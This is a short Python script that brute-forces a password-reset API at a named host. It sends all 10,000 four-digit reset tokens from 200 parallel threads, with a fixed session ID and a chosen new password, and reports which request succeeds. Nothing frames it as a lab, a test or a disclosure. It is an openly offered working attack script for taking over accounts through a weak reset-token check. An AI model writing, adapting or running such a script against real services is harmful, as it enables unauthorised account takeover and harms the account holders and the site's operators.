import requests
from concurrent.futures import ThreadPoolExecutor


# Function to handle the POST request
def send_request(i):
    headers = {
        'accept': '*/*',
    }

    files = {
        'Session': (None, '13bbf9da-06cb-46b9-9f28-2666df910078'),
        'Token': (None, str(i).zfill(4)),
        'NewPassword': (None, 'Testtesttes1'),
    }

    response = requests.post('https://legacy-unloaded.wep.dk/api/v2/auth/reset-password', headers=headers, files=files)

    if response.status_code == 200:
        print(f"Request {i}: DONE")
    elif response.status_code != 400:
        print("FAK")

    return response.text


# Create a ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=200) as executor:
    # Submit tasks for execution in parallel
    futures = [executor.submit(send_request, i) for i in range(10000)]

    # Ensure all threads finish and process results
    for future in futures:
        try:
            result = future.result()
            # Optionally process the result here if needed
        except Exception as e:
            print(f"Request failed: {e}")